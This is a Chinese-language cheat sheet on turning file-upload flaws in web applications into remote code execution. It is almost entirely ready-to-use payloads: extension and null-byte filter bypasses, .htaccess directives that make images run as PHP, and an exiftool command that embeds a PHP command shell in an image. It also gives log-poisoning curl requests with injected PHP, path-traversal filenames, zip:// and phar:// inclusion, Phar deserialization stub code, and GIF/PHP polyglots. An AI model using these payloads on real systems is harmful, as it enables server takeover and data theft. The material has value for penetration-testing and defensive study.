# 文件上传到 RCE 技巧

## 后缀绕过

### 常见可执行后缀（按优先级）

| 语言 | 后缀 |
|------|------|
| PHP | `.php` `.php3` `.php4` `.php5` `.php7` `.phtml` `.pht` `.phps` `.phar` |
| JSP | `.jsp` `.jspx` `.jspf` |
| ASP | `.asp` `.aspx` `.asa` `.ascx` `.ashx` |
| Python | `.py` `.pyc` `.pyo` |

### 大小写绕过
```
.PhP .pHp .PHP .PhP5 .phtml
```

### 双写绕过
```
.pphp   → 过滤一次后变成 .php
.phphpp → 过滤一次后变成 .php
```

### 空字节绕过（旧版 PHP/Java）
```
shell.php%00.jpg    # PHP < 5.3.4
shell.php\x00.jpg   # Java 某些版本
```

### .htaccess 上传

上传 `.htaccess` 文件修改 Apache 解析规则：

```apache
# 方法1：让 .jpg 当 PHP 执行
AddType application/x-httpd-php .jpg

# 方法2：自定义处理器
AddHandler php-script .jpg

# 方法3：php_value 自动包含
php_value auto_prepend_file /tmp/evil.php

# 方法4：利用 php_value 注入
php_value auto_append_file "php://filter/convert.base64-decode/resource=shell.jpg"
```

## MIME 类型绕过

| 检查方式 | 绕过方法 |
|---------|---------|
| 检查 Content-Type | 改为 `image/jpeg` / `image/png` / `image/gif` |
| 检查文件头 (magic bytes) | 在 payload 前加 GIF89a / PNG 头 |
| 检查 getimagesize() | 使用真实图片 + payload 拼接（图片马） |
| 检查文件内容 | 使用短标签 + 图片头 |

### 图片马制作
```bash
# 方法1：copy 拼接
copy normal.jpg/b + shell.php/a webshell.jpg

# 方法2：exif 注入
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg

# 方法3：BMP 像素马
# 将 PHP 代码编码为 BMP 像素值，绕过图片检查
```

## 目录穿越上传

```
# 文件名中注入路径
filename="../../../var/www/html/shell.php"
filename="shell.php%00.jpg"    # 空字节
filename="....//....//shell.php"
```

## 日志投毒

```bash
# 1. 向日志注入 PHP 代码
curl http://target/<?php system('id'); ?>

# 2. User-Agent 注入
curl -H "User-Agent: <?php system('id'); ?>" http://target/

# 3. 包含日志文件
# 如果有 LFI：?file=/var/log/apache2/access.log
# 或：?file=/var/log/nginx/access.log
```

## ZIP / Phar 利用

### ZIP PHP Webshell
```php
// 上传 shell.zip，里面包含 shell.php
// 通过 zip:// 或 phar:// 协议读取
// ?file=zip:///var/www/html/shell.zip%23shell.php
// ?file=phar:///var/www/html/shell.phar
```

### Phar 反序列化
```php
// Phar 文件的 meta-data 会在 file_exists() / is_file() 等函数触发时反序列化
$phar = new Phar('shell.phar');
$phar->startBuffering();
$phar->setStub('<?php __HALT_COMPILER(); ?>');
$phar->setMetadata(new EvilClass());  // 恶意对象
$phar->stopBuffering();
```

## Polyglot 文件

```
# 同时是合法图片和 PHP 文件的 polyglot
# GIF89a<?php system('id'); ?>
# 保存为 .php 后缀
# 或结合 .htaccess 让 .gif 当 PHP 解析
```
